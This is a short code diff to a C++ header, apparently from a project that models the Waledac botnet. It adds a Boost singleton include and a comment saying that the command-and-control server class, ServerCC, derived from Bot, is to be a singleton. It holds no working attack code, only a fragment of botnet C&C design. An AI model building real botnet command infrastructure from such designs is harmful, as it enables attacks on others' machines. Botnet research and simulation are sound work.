@@ -21,9 +21,14 @@
 
 #include <boost/smart_ptr.hpp>
 #include <boost/thread.hpp>
+#include <boost/serialization/singleton.hpp>
 
 namespace waledac {
 
+/*
+ * Structure of server C&C.
+ * Remark : the server C&C should be implemented as a singleton class,
+ */
 class ServerCC : public Bot
 {
 private:
